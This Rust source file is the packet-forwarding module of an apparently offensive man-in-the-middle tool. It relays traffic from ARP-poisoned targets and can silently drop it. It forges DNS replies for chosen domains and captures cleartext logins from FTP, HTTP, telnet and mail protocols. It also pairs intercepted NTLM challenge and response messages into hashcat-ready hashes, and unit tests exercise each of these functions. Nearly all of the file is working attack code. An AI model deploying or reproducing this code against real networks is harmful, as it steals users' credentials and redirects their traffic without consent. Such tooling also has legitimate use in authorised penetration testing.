// forwarding

use anyhow::Result;
use pnet_packet::ethernet::{EtherTypes, EthernetPacket};
use pnet_packet::ipv4::Ipv4Packet;
use pnet_packet::Packet;
use std::collections::HashMap;
use std::net::Ipv4Addr;
use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::{mpsc, Arc, Mutex};
use std::time::Duration;

use crate::attacks::dns_spoof;
use crate::attacks::ntlmssp;
use crate::net::arp;
use crate::net::iface::IfaceInfo;

pub type SharedTargets = Arc<Mutex<Vec<(Ipv4Addr, [u8; 6])>>>;

pub type SharedDnsRules = Arc<Mutex<Vec<(String, Ipv4Addr)>>>;

// canonicalized 4-tuple identifying an ntlm auth exchange (symmetric across
// challenge/response directions). value is the server's 8-byte challenge.
pub type NtlmFlowKey = (Ipv4Addr, u16, Ipv4Addr, u16);
pub type SharedNtlmFlows = Arc<Mutex<HashMap<NtlmFlowKey, [u8; 8]>>>;

// "the tao that can be told is not the eternal tao." — tao te ching, 1

#[derive(Debug, Clone)]
pub enum ForwardEvent {
    PacketForwarded { src: Ipv4Addr, dst: Ipv4Addr, len: usize, proto: u8 },
    Credential { proto: String, detail: String },
    DnsQuery { name: String, src: Ipv4Addr },
    DnsSpoofed { name: String, spoof_ip: Ipv4Addr, src: Ipv4Addr },
    RawFrame { data: Vec<u8>, timestamp_us: u64 },
    Dropped { src: Ipv4Addr, dst: Ipv4Addr },
}

// shared targets behind mutex for live updates
#[derive(Debug, Clone)]
pub struct ForwardConfig {
    pub targets: SharedTargets,
    pub gateway_mac: [u8; 6],
    pub kill_mode: bool,
    pub dns_spoofs: SharedDnsRules,
    pub sniff_creds: bool,
    pub capture: bool,
    pub ntlm_flows: SharedNtlmFlows,
}

// receive, inspect, forward
pub fn forwarding_loop(
    info: &IfaceInfo,
    config: ForwardConfig,
    event_tx: mpsc::Sender<ForwardEvent>,
    stop: Arc<AtomicBool>,
) -> Result<()> {
    let (mut tx, mut rx) = arp::open_channel(&info.iface)?;

    while !stop.load(Ordering::Relaxed) {
        let frame_data = match rx.next() {
            Ok(data) => data.to_vec(),
            Err(e) => {
                if e.kind() != std::io::ErrorKind::TimedOut {
                    log::debug!("recv error in forwarding: {}", e);
                }
                continue;
            }
        };

        let eth = match EthernetPacket::new(&frame_data) {
            Some(e) => e,
            None => continue,
        };

        // ipv4 only
        if eth.get_ethertype() != EtherTypes::Ipv4 {
            continue;
        }

        let ipv4 = match Ipv4Packet::new(eth.payload()) {
            Some(p) => p,
            None => continue,
        };

        let src_ip = ipv4.get_source();
        let dst_ip = ipv4.get_destination();
        let proto = ipv4.get_next_level_protocol().0;

        let src_mac = eth.get_source().octets();
        let targets = config.targets.lock().unwrap();
        if targets.is_empty() {
            drop(targets);
            continue;
        }
        let is_from_target = targets.iter().any(|(_, mac)| *mac == src_mac);
        drop(targets);

        let is_from_gateway = src_mac == config.gateway_mac;

        if !is_from_target && !is_from_gateway {
            continue;
        }

        // capture
        if config.capture {
            let ts = std::time::SystemTime::now()
                .duration_since(std::time::UNIX_EPOCH)
                .unwrap_or(Duration::ZERO)
                .as_micros() as u64;
            let _ = event_tx.send(ForwardEvent::RawFrame {
                data: frame_data.clone(),
                timestamp_us: ts,
            });
        }

        // kill
        if config.kill_mode {
            let _ = event_tx.send(ForwardEvent::Dropped { src: src_ip, dst: dst_ip });
            continue;
        }

        // creds
        if config.sniff_creds {
            if let Some(cred) = sniff_credentials(&ipv4) {
                let _ = event_tx.send(cred);
            }
            if let Some(cred) = sniff_ntlm_http(&ipv4, &config.ntlm_flows) {
                let _ = event_tx.send(cred);
            }
        }

        // dns spoof: udp/53 from targets
        if is_from_target && proto == 17 {
            let dns_rules = config.dns_spoofs.lock().unwrap();
            if !dns_rules.is_empty() {
                let rules = dns_rules.clone();
                drop(dns_rules);
                if let Some(spoofed_frame) = try_dns_spoof(
                    &ipv4,
                    &rules,
                    &src_mac,
                    &info.mac,
                    &event_tx,
                ) {
                    if let Err(e) = arp::send_arp_frame(tx.as_mut(), &spoofed_frame) {
                        log::debug!("dns spoof inject error: {}", e);
                    }
                }
            }
        }

        let _ = event_tx.send(ForwardEvent::PacketForwarded {
            src: src_ip,
            dst: dst_ip,
            len: frame_data.len(),
            proto,
        });
    }

    Ok(())
}

// spoof dns query, return eth frame if matched
fn try_dns_spoof(
    ipv4: &Ipv4Packet,
    rules: &[(String, Ipv4Addr)],
    sender_mac: &[u8; 6],
    our_mac: &[u8; 6],
    event_tx: &mpsc::Sender<ForwardEvent>,
) -> Option<Vec<u8>> {
    let ip_payload = ipv4.payload();
    if ip_payload.len() < 8 {
        return None;
    }

    let dst_port = u16::from_be_bytes([ip_payload[2], ip_payload[3]]);
    if dst_port != 53 {
        return None;
    }

    let src_port = u16::from_be_bytes([ip_payload[0], ip_payload[1]]);
    let dns_payload = &ip_payload[8..];

    let query_name = dns_spoof::extract_query_name(dns_payload)?;
    let src_ip = ipv4.get_source();

    let _ = event_tx.send(ForwardEvent::DnsQuery {
        name: query_name.clone(),
        src: src_ip,
    });

    let spoof_ip = rules.iter().find_map(|(domain, ip)| {
        if dns_spoof::matches_rule(&query_name, domain) {
            Some(*ip)
        } else {
            None
        }
    })?;

    let spoofed_dns = dns_spoof::build_spoofed_response(dns_payload, spoof_ip)?;

    let frame = build_dns_response_frame(
        our_mac,
        sender_mac,
        ipv4.get_destination(),
        src_ip,
        dst_port,
        src_port,
        &spoofed_dns,
    )?;

    let _ = event_tx.send(ForwardEvent::DnsSpoofed {
        name: query_name,
        spoof_ip,
        src: src_ip,
    });

    Some(frame)
}

// build eth/ip/udp/dns response frame
fn build_dns_response_frame(
    src_mac: &[u8; 6],
    dst_mac: &[u8; 6],
    src_ip: Ipv4Addr,
    dst_ip: Ipv4Addr,
    src_port: u16,
    dst_port: u16,
    dns_payload: &[u8],
) -> Option<Vec<u8>> {
    let udp_len = 8 + dns_payload.len();
    let ip_total_len = 20 + udp_len;
    let frame_len = 14 + ip_total_len;

    let mut frame = vec![0u8; frame_len];

    // eth
    frame[0..6].copy_from_slice(dst_mac);
    frame[6..12].copy_from_slice(src_mac);
    frame[12] = 0x08;
    frame[13] = 0x00;

    // ipv4
    let ip = &mut frame[14..34];
    ip[0] = 0x45;
    ip[1] = 0x00;
    let total = ip_total_len as u16;
    ip[2] = (total >> 8) as u8;
    ip[3] = total as u8;
    ip[4] = 0x00;
    ip[5] = 0x00;
    ip[6] = 0x40; // df
    ip[7] = 0x00;
    ip[8] = 64;   // ttl
    ip[9] = 17;   // udp
    ip[10] = 0;
    ip[11] = 0;
    let src_octets = src_ip.octets();
    let dst_octets = dst_ip.octets();
    ip[12..16].copy_from_slice(&src_octets);
    ip[16..20].copy_from_slice(&dst_octets);

    let cksum = ipv4_checksum(&frame[14..34]);
    frame[24] = (cksum >> 8) as u8;
    frame[25] = cksum as u8;

    // udp
    let udp = &mut frame[34..42];
    udp[0] = (src_port >> 8) as u8;
    udp[1] = src_port as u8;
    udp[2] = (dst_port >> 8) as u8;
    udp[3] = dst_port as u8;
    let ulen = udp_len as u16;
    udp[4] = (ulen >> 8) as u8;
    udp[5] = ulen as u8;
    udp[6] = 0;
    udp[7] = 0;

    // dns
    frame[42..].copy_from_slice(dns_payload);

    Some(frame)
}

// rfc 1071
fn ipv4_checksum(header: &[u8]) -> u16 {
    let mut sum: u32 = 0;
    let mut i = 0;
    while i < header.len() - 1 {
        let word = u16::from_be_bytes([header[i], header[i + 1]]);
        sum += word as u32;
        i += 2;
    }
    while sum >> 16 != 0 {
        sum = (sum & 0xffff) + (sum >> 16);
    }
    !(sum as u16)
}

// cleartext credential sniffing
fn sniff_credentials(ipv4: &Ipv4Packet) -> Option<ForwardEvent> {
    let proto = ipv4.get_next_level_protocol().0;

    // tcp only
    if proto != 6 {
        return None;
    }

    let payload = ipv4.payload();
    if payload.len() < 20 {
        return None;
    }

    let data_offset = ((payload[12] >> 4) as usize) * 4;
    if data_offset >= payload.len() {
        return None;
    }

    let tcp_payload = &payload[data_offset..];
    if tcp_payload.is_empty() {
        return None;
    }

    let dst_port = u16::from_be_bytes([payload[2], payload[3]]);
    let src_port = u16::from_be_bytes([payload[0], payload[1]]);

    let text = String::from_utf8_lossy(tcp_payload);

    // ftp
    if dst_port == 21 || src_port == 21 {
        if let Some(line) = text.lines().next() {
            let upper = line.to_uppercase();
            if upper.starts_with("USER ") || upper.starts_with("PASS ") {
                return Some(ForwardEvent::Credential {
                    proto: "ftp".into(),
                    detail: line.trim().to_string(),
                });
            }
        }
    }

    // http basic auth + post creds
    if dst_port == 80 || dst_port == 8080 {
        for line in text.lines() {
            let lower = line.to_lowercase();
            if lower.starts_with("authorization: basic ") {
                return Some(ForwardEvent::Credential {
                    proto: "http-basic".into(),
                    detail: line.trim().to_string(),
                });
            }
            if lower.contains("password=") || lower.contains("passwd=") || lower.contains("pass=")
            {
                return Some(ForwardEvent::Credential {
                    proto: "http-post".into(),
                    detail: line.trim().chars().take(200).collect(),
                });
            }
        }
    }

    // telnet, pop3, imap, smtp
    let cleartext_ports = [23, 25, 110, 143, 587];
    if cleartext_ports.contains(&dst_port) || cleartext_ports.contains(&src_port) {
        if let Some(line) = text.lines().next() {
            let upper = line.to_uppercase();
            if upper.starts_with("USER ")
                || upper.starts_with("PASS ")
                || upper.starts_with("AUTH ")
                || upper.starts_with("LOGIN ")
            {
                let proto_name = match dst_port {
                    23 => "telnet",
                    25 | 587 => "smtp",
                    110 => "pop3",
                    143 => "imap",
                    _ => "cleartext",
                };
                return Some(ForwardEvent::Credential {
                    proto: proto_name.into(),
                    detail: line.trim().to_string(),
                });
            }
        }
    }

    None
}

// canonical 4-tuple: smaller (ip, port) always first so challenge+response
// on the same tcp connection hash to the same slot.
fn flow_key(
    src_ip: Ipv4Addr,
    src_port: u16,
    dst_ip: Ipv4Addr,
    dst_port: u16,
) -> NtlmFlowKey {
    if (src_ip, src_port) < (dst_ip, dst_port) {
        (src_ip, src_port, dst_ip, dst_port)
    } else {
        (dst_ip, dst_port, src_ip, src_port)
    }
}

fn is_http_port(p: u16) -> bool {
    matches!(p, 80 | 8080)
}

// locate an NTLM auth header line; return (base64_blob, is_server_challenge).
// http headers are ascii so byte-slicing at fixed lengths is safe here.
fn extract_ntlm_header(text: &str) -> Option<(&str, bool)> {
    const AUTH: &str = "Authorization: NTLM ";
    const WWW: &str = "WWW-Authenticate: NTLM ";
    for line in text.lines() {
        if let Some(head) = line.get(..AUTH.len()) {
            if head.eq_ignore_ascii_case(AUTH) {
                return Some((line[AUTH.len()..].trim(), false));
            }
        }
        if let Some(head) = line.get(..WWW.len()) {
            if head.eq_ignore_ascii_case(WWW) {
                return Some((line[WWW.len()..].trim(), true));
            }
        }
    }
    None
}

// inspect an http/tcp packet for ntlmssp; update per-flow state; emit a
// credential event when we pair a challenge with an authenticate.
fn sniff_ntlm_http(ipv4: &Ipv4Packet, flows: &SharedNtlmFlows) -> Option<ForwardEvent> {
    if ipv4.get_next_level_protocol().0 != 6 {
        return None; // tcp only
    }
    let payload = ipv4.payload();
    if payload.len() < 20 {
        return None;
    }
    let data_offset = ((payload[12] >> 4) as usize) * 4;
    if data_offset >= payload.len() {
        return None;
    }
    let tcp_payload = &payload[data_offset..];
    if tcp_payload.is_empty() {
        return None;
    }

    let src_port = u16::from_be_bytes([payload[0], payload[1]]);
    let dst_port = u16::from_be_bytes([payload[2], payload[3]]);
    if !is_http_port(src_port) && !is_http_port(dst_port) {
        return None;
    }

    let text = String::from_utf8_lossy(tcp_payload);
    let (blob, _is_challenge_header) = extract_ntlm_header(&text)?;
    let decoded = ntlmssp::base64_decode(blob)?;
    let (off, msg_type) = ntlmssp::find_message(&decoded)?;
    let msg = &decoded[off..];

    let key = flow_key(ipv4.get_source(), src_port, ipv4.get_destination(), dst_port);

    match msg_type {
        ntlmssp::NtlmMessageType::Challenge => {
            if let Some(ch) = ntlmssp::parse_challenge(msg) {
                if let Ok(mut map) = flows.lock() {
                    map.insert(key, ch);
                }
            }
            None
        }
        ntlmssp::NtlmMessageType::Authenticate => {
            let auth = ntlmssp::parse_authenticate(msg)?;
            let challenge = flows.lock().ok()?.remove(&key)?;
            let line = ntlmssp::format_hashcat_5600(
                &auth.username,
                &auth.domain,
                &challenge,
                &auth.nt_response,
            )?;
            Some(ForwardEvent::Credential {
                proto: "ntlm-v2-http".into(),
                detail: line,
            })
        }
        ntlmssp::NtlmMessageType::Negotiate => None,
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    // fake ipv4+tcp packet
    fn make_fake_tcp_ipv4(dst_port: u16, payload: &[u8]) -> Vec<u8> {
        let total_len = 20 + 20 + payload.len();
        let mut buf = vec![0u8; total_len];

        buf[0] = 0x45;
        let len = total_len as u16;
        buf[2] = (len >> 8) as u8;
        buf[3] = len as u8;
        buf[9] = 6; // tcp

        let tcp = &mut buf[20..];
        tcp[0] = 0;
        tcp[1] = 80;
        tcp[2] = (dst_port >> 8) as u8;
        tcp[3] = dst_port as u8;
        tcp[12] = 0x50;

        buf[40..].copy_from_slice(payload);

        buf
    }

    #[test]
    fn test_sniff_ftp_user() {
        let payload = b"USER admin\r\n";
        let raw = make_fake_tcp_ipv4(21, payload);
        let ipv4 = Ipv4Packet::new(&raw).unwrap();
        let result = sniff_credentials(&ipv4);
        assert!(result.is_some());
        if let Some(ForwardEvent::Credential { proto, detail }) = result {
            assert_eq!(proto, "ftp");
            assert!(detail.contains("USER admin"));
        }
    }

    #[test]
    fn test_sniff_ftp_pass() {
        let payload = b"PASS secret123\r\n";
        let raw = make_fake_tcp_ipv4(21, payload);
        let ipv4 = Ipv4Packet::new(&raw).unwrap();
        let result = sniff_credentials(&ipv4);
        assert!(result.is_some());
        if let Some(ForwardEvent::Credential { proto, detail }) = result {
            assert_eq!(proto, "ftp");
            assert!(detail.contains("PASS secret123"));
        }
    }

    #[test]
    fn test_sniff_http_basic_auth() {
        let payload = b"GET / HTTP/1.1\r\nAuthorization: Basic dXNlcjpwYXNz\r\n\r\n";
        let raw = make_fake_tcp_ipv4(80, payload);
        let ipv4 = Ipv4Packet::new(&raw).unwrap();
        let result = sniff_credentials(&ipv4);
        assert!(result.is_some());
        if let Some(ForwardEvent::Credential { proto, detail }) = result {
            assert_eq!(proto, "http-basic");
            assert!(detail.contains("Basic"));
        }
    }

    #[test]
    fn test_sniff_http_post_password() {
        let payload = b"POST /login HTTP/1.1\r\nContent-Length: 30\r\n\r\nusername=admin&password=secret";
        let raw = make_fake_tcp_ipv4(80, payload);
        let ipv4 = Ipv4Packet::new(&raw).unwrap();
        let result = sniff_credentials(&ipv4);
        assert!(result.is_some());
        if let Some(ForwardEvent::Credential { proto, detail }) = result {
            assert_eq!(proto, "http-post");
            assert!(detail.contains("password=secret"));
        }
    }

    #[test]
    fn test_sniff_no_creds_in_normal_traffic() {
        let payload = b"GET /index.html HTTP/1.1\r\nHost: example.com\r\n\r\n";
        let raw = make_fake_tcp_ipv4(80, payload);
        let ipv4 = Ipv4Packet::new(&raw).unwrap();
        let result = sniff_credentials(&ipv4);
        assert!(result.is_none());
    }

    #[test]
    fn test_sniff_empty_payload() {
        let raw = make_fake_tcp_ipv4(80, b"");
        let ipv4 = Ipv4Packet::new(&raw).unwrap();
        let result = sniff_credentials(&ipv4);
        assert!(result.is_none());
    }

    #[test]
    fn test_sniff_telnet_user() {
        let payload = b"USER root\r\n";
        let raw = make_fake_tcp_ipv4(23, payload);
        let ipv4 = Ipv4Packet::new(&raw).unwrap();
        let result = sniff_credentials(&ipv4);
        assert!(result.is_some());
        if let Some(ForwardEvent::Credential { proto, .. }) = result {
            assert_eq!(proto, "telnet");
        }
    }

    #[test]
    fn test_ipv4_checksum_zeros() {
        let header = [0u8; 20];
        assert_eq!(ipv4_checksum(&header), 0xffff);
    }

    #[test]
    fn test_ipv4_checksum_known_good() {
        let mut header = [0u8; 20];
        header[0] = 0x45;
        header[2] = 0x00; header[3] = 0x3c;
        header[8] = 64;
        header[9] = 17;
        header[12] = 192; header[13] = 168; header[14] = 1; header[15] = 100;
        header[16] = 8; header[17] = 8; header[18] = 8; header[19] = 8;

        let cksum = ipv4_checksum(&header);
        header[10] = (cksum >> 8) as u8;
        header[11] = cksum as u8;
        assert_eq!(ipv4_checksum(&header), 0);
    }

    #[test]
    fn test_build_dns_response_frame_structure() {
        let src_mac = [0xaa; 6];
        let dst_mac = [0xbb; 6];
        let dns_payload = vec![0xde, 0xad, 0xbe, 0xef];

        let frame = build_dns_response_frame(
            &src_mac,
            &dst_mac,
            Ipv4Addr::new(8, 8, 8, 8),
            Ipv4Addr::new(192, 168, 1, 50),
            53,
            12345,
            &dns_payload,
        )
        .unwrap();

        assert_eq!(frame.len(), 46);
        assert_eq!(&frame[0..6], &dst_mac);
        assert_eq!(&frame[6..12], &src_mac);
        assert_eq!(&frame[12..14], &[0x08, 0x00]);
        assert_eq!(frame[14], 0x45);
        assert_eq!(frame[23], 17);
        assert_eq!(&frame[26..30], &[8, 8, 8, 8]);
        assert_eq!(&frame[30..34], &[192, 168, 1, 50]);
        assert_eq!(ipv4_checksum(&frame[14..34]), 0);
        assert_eq!(u16::from_be_bytes([frame[34], frame[35]]), 53);
        assert_eq!(u16::from_be_bytes([frame[36], frame[37]]), 12345);
        assert_eq!(u16::from_be_bytes([frame[38], frame[39]]), 12);
        assert_eq!(&frame[42..], &dns_payload);
    }

    // build a minimal ipv4+tcp packet with controllable src/dst ports and ips
    fn make_tcp_ipv4_full(
        src_ip: Ipv4Addr,
        dst_ip: Ipv4Addr,
        src_port: u16,
        dst_port: u16,
        payload: &[u8],
    ) -> Vec<u8> {
        let total_len = 20 + 20 + payload.len();
        let mut buf = vec![0u8; total_len];
        buf[0] = 0x45;
        let len = total_len as u16;
        buf[2] = (len >> 8) as u8;
        buf[3] = len as u8;
        buf[9] = 6; // tcp
        buf[12..16].copy_from_slice(&src_ip.octets());
        buf[16..20].copy_from_slice(&dst_ip.octets());
        let tcp = &mut buf[20..40];
        tcp[0] = (src_port >> 8) as u8;
        tcp[1] = src_port as u8;
        tcp[2] = (dst_port >> 8) as u8;
        tcp[3] = dst_port as u8;
        tcp[12] = 0x50; // data offset = 20 bytes
        buf[40..].copy_from_slice(payload);
        buf
    }

    #[test]
    fn test_sniff_ntlm_http_challenge_alone_does_not_emit() {
        let flows: SharedNtlmFlows = Arc::new(Mutex::new(HashMap::new()));
        let ch_msg = ntlmssp::build_challenge_msg_for_tests([0xab; 8]);
        let body = format!(
            "HTTP/1.1 401 Unauthorized\r\nWWW-Authenticate: NTLM {}\r\n\r\n",
            ntlmssp::base64_encode(&ch_msg)
        );
        let server = Ipv4Addr::new(10, 0, 0, 10);
        let client = Ipv4Addr::new(10, 0, 0, 20);
        let raw = make_tcp_ipv4_full(server, client, 80, 40000, body.as_bytes());
        let ipv4 = Ipv4Packet::new(&raw).unwrap();

        assert!(sniff_ntlm_http(&ipv4, &flows).is_none());
        assert_eq!(flows.lock().unwrap().len(), 1);
    }

    #[test]
    fn test_sniff_ntlm_http_full_pairing_emits_credential() {
        let flows: SharedNtlmFlows = Arc::new(Mutex::new(HashMap::new()));
        let server = Ipv4Addr::new(10, 0, 0, 10);
        let client = Ipv4Addr::new(10, 0, 0, 20);
        let client_port = 40000u16;

        // 1) server → client CHALLENGE
        let challenge = [0xaa, 0xbb, 0xcc, 0xdd, 0x11, 0x22, 0x33, 0x44];
        let ch_msg = ntlmssp::build_challenge_msg_for_tests(challenge);
        let ch_body = format!(
            "HTTP/1.1 401 Unauthorized\r\nWWW-Authenticate: NTLM {}\r\n\r\n",
            ntlmssp::base64_encode(&ch_msg)
        );
        let raw1 = make_tcp_ipv4_full(server, client, 80, client_port, ch_body.as_bytes());
        let pkt1 = Ipv4Packet::new(&raw1).unwrap();
        assert!(sniff_ntlm_http(&pkt1, &flows).is_none());

        // 2) client → server AUTHENTICATE
        let mut nt_response = vec![0u8; 16]; // NTproofStr
        nt_response[0..16].copy_from_slice(&[0x77; 16]);
        nt_response.extend_from_slice(&[0x88; 40]); // blob
        let auth_msg =
            ntlmssp::build_authenticate_msg_for_tests("CORP", "alice", &nt_response);
        let auth_body = format!(
            "GET / HTTP/1.1\r\nAuthorization: NTLM {}\r\n\r\n",
            ntlmssp::base64_encode(&auth_msg)
        );
        let raw2 = make_tcp_ipv4_full(client, server, client_port, 80, auth_body.as_bytes());
        let pkt2 = Ipv4Packet::new(&raw2).unwrap();

        let ev = sniff_ntlm_http(&pkt2, &flows).expect("pairing should emit a credential");
        match ev {
            ForwardEvent::Credential { proto, detail } => {
                assert_eq!(proto, "ntlm-v2-http");
                assert!(detail.starts_with("alice::CORP:aabbccdd11223344:"));
                // NTproofStr (16 bytes of 0x77) = 32 × '7'
                assert!(detail.contains("77777777777777777777777777777777"));
            }
            _ => panic!("expected Credential"),
        }

        // flow state consumed on pairing
        assert!(flows.lock().unwrap().is_empty());
    }

    #[test]
    fn test_sniff_ntlm_http_orphan_authenticate_yields_nothing() {
        let flows: SharedNtlmFlows = Arc::new(Mutex::new(HashMap::new()));
        let mut nt = vec![0u8; 16];
        nt.extend_from_slice(&[0u8; 32]);
        let auth_msg = ntlmssp::build_authenticate_msg_for_tests("D", "U", &nt);
        let body = format!(
            "GET / HTTP/1.1\r\nAuthorization: NTLM {}\r\n\r\n",
            ntlmssp::base64_encode(&auth_msg)
        );
        let raw = make_tcp_ipv4_full(
            Ipv4Addr::new(10, 0, 0, 20),
            Ipv4Addr::new(10, 0, 0, 10),
            40000,
            80,
            body.as_bytes(),
        );
        let pkt = Ipv4Packet::new(&raw).unwrap();
        // no stored challenge for this flow → no credential emitted
        assert!(sniff_ntlm_http(&pkt, &flows).is_none());
    }

    #[test]
    fn test_sniff_ntlm_http_ignores_non_http_ports() {
        let flows: SharedNtlmFlows = Arc::new(Mutex::new(HashMap::new()));
        let ch_msg = ntlmssp::build_challenge_msg_for_tests([0; 8]);
        let body = format!(
            "something: NTLM {}\r\n",
            ntlmssp::base64_encode(&ch_msg)
        );
        // port 22 instead of 80
        let raw = make_tcp_ipv4_full(
            Ipv4Addr::new(10, 0, 0, 1),
            Ipv4Addr::new(10, 0, 0, 2),
            22,
            40000,
            body.as_bytes(),
        );
        let pkt = Ipv4Packet::new(&raw).unwrap();
        assert!(sniff_ntlm_http(&pkt, &flows).is_none());
        assert_eq!(flows.lock().unwrap().len(), 0);
    }

    #[test]
    fn test_build_dns_response_frame_empty_payload() {
        let frame = build_dns_response_frame(
            &[0; 6],
            &[0; 6],
            Ipv4Addr::LOCALHOST,
            Ipv4Addr::LOCALHOST,
            53,
            1234,
            &[],
        )
        .unwrap();
        assert_eq!(frame.len(), 42);
    }
}
